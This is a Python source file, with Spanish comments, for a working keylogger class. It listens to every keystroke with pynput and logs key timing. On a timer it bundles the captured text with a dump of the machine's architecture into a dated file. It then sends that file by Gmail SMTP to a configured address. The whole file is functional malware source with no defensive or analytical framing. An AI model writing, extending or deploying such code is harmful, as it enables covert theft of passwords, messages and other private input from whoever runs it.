import pynput.keyboard
import threading
import smtplib
from datetime import date
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
import contador
import report
import os
import sys
import fileinput
import timing



log =""

#Clase keylogger
class Keylogger:
    captcha=""
    keyword=""
    inicio=""
    fin=""
    txt=report.report("reporte_timing.txt")
    count=0

    z = datetime.now()
    m = "keylogger_fecha_{}.txt".format(z.strftime("%d-%m-%Y_%H-%M-%S"))
    #inicializando valores
    def __init__(self, time_interval, email, password):
        self.log=""
        self.interval = time_interval
        self.email = email
        self.password = password
        
    #uniendo los valores
    def append_to_log(self,string):
        self.log=self.log + string
    #leyendo el ingreso
    def process_key_press(self, key):
        self.pressKey(key)
        try:
            current_key = str(key.char)
            self.keyword = current_key
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key= " " + str(key) + " " 
        self.leaveKey(key)
        self.append_to_log(current_key)
        return current_key

    #generando reporte y enviando el archivo al correo
    def report(self):
        #print(self.log) #impresion en pantalla 
        #self.send_mail(self.email, self.password, self.log) #envio de los datos capturados sin el txt
        self.crearTXT(self.log)
        self.sendmailwithtxt(self.email, self.password)
        self.log=""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    #Crea el txt con los datos capturados
    def crearTXT(self,captexto):
        archivo = open(self.m,"w")
        archivo.write(captexto)
        archivo.close()
        contador.ContarTxt(self.m)
        arq = report.report("arquitectura.txt") #Se crea el txt
        arq.arch()                              #se capta el comando para llenar arquitectura.txt
        #Se empieza a eliminar caracteres no legibles para enviar correo
        cts1 = "@"
        cts2 = "«"
        cts3 = "»"
        ctr = " "
        ftS = "arquitectura.txt"
        with open(ftS,"r") as file:
            filedata = file.read()
        filedata = filedata.replace(cts1,ctr)
        with open(ftS,"w") as file:
            file.write(filedata)
        filedata = filedata.replace(cts2,ctr)
        with open(ftS,"w") as file:
            file.write(filedata)
        filedata = filedata.replace(cts3,ctr)
        with open(ftS,"w") as file:
            file.write(filedata)
        filedata = filedata.replace("á","a")
        with open(ftS,"w") as file:
            file.write(filedata)
        filedata = filedata.replace("é","e")
        with open(ftS,"w") as file:
            file.write(filedata)
        filedata = filedata.replace("í","i")
        with open(ftS,"w") as file:
            file.write(filedata)
        filedata = filedata.replace("ó","o")
        with open(ftS,"w") as file:
            file.write(filedata)
        filedata = filedata.replace("ú","u")
        with open(ftS,"w") as file:
            file.write(filedata)
        #se termina de eliminar caracteres no legibles para enviar correo
        archivo = open("arquitectura.txt","r")
        cad = archivo.read()
        archivo.close()        
        archivo = open(self.m,"w")
        archivo.write('***************************Arquitectura del computador***************************''\n'+cad+'\n')
        archivo.close()
        archivo = open(self.m,"a")
        archivo.write('*********************************Texto Capturado*********************************'+'\n'+captexto+'\n')
        archivo.close()
        archivo = open("temp.txt","r")
        cadenita=str(archivo.read())
        archivo.close()
        archivo = open(self.m,"a")
        archivo.write(cadenita)
        archivo.close()
        """ archivo = open("reporte_timing.txt","r")
        cad = archivo.read()
        archivo.close()
        archivo = open(self.m, "a")
        archivo.write('***************************Reporte Time Key***************************''\n'+cad+'\n')
        archivo.close() """

    #inicia el proceso
    def start(self ):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
       
    
    """ def start(self,repoTiming):
        self.txt=repoTiming
        keyboard_listener = pynput.keyboard.Listener(self.pressKey, self.leaveKey, self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join() """
  
    
    #envia el txt al correo
    def sendmailwithtxt(self, email, password):
        mensaje = MIMEMultipart("plain")
        mensaje["From"] = email
        mensaje["To"]= email
        mensaje["Subject"] = "Keylogger"
        adjunto = MIMEBase("application", "octect-stream")
        adjunto.set_payload(open(self.m,"rb").read())
        adjunto.add_header("content-Disposition",'attachment; filename={}'.format(self.m))
        mensaje.attach(adjunto)
        smtp = smtplib.SMTP("smtp.gmail.com", 587)
        smtp.starttls()
        smtp.login(email, password)
        
        smtp.sendmail(email, email, mensaje.as_string())
        smtp.quit()

    #timing
    def pressRecord(self,rt):
        self.captcha=self.keyword+"\t\t\t"+self.inicio+"\t\t"+self.fin
        rt.timing(self.captcha,rt.setName())
        self.captcha=""

    def pressKey(self, key):
        if self.count==0:
            self.inicio=str(datetime.today())
        self.count=self.count+1

    def leaveKey(self, key):
        self.fin=str(datetime.today())
        self.pressRecord(self.txt)
        self.count=0
